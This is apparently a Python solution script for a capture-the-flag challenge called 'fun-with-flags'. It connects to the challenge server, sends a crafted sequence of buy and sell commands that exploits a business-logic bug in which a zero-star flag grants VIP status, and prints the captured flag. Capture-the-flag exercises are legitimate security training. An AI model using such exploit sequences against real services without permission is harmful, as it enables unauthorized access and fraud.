import re
from sys import path
path.insert(0, '..')
from connection import Socket

if __name__ == '__main__':
    BUY, SELL, SHOW_STATS, FIRST_FLAG, INVALID_FLAG, RUSSIA_FLAG, CSA_FLAG = '2', '3', '5', '0', '20', '10', '12'

    s = Socket("fun-with-flags.csa-challenge.com", 6666)
    s.connect()
    s.send('\n'.join((BUY, '3', '10', FIRST_FLAG, FIRST_FLAG)))
    s.send('\n'.join((SELL, '3', FIRST_FLAG, INVALID_FLAG, INVALID_FLAG)))
    s.send('\n'.join((SELL, '2', FIRST_FLAG, FIRST_FLAG)))
    # Russia flag has 0 stars, so if we buy it we'll become VIP (because of the bug)
    s.send('\n'.join((BUY, '2', RUSSIA_FLAG, CSA_FLAG, SHOW_STATS)))

    msg = s.recv().decode()
    flag = re.search("CSA{.*}", msg)
    if flag:
        print("The flag is:", flag.group())
    else:
        print(msg)
    s.close()
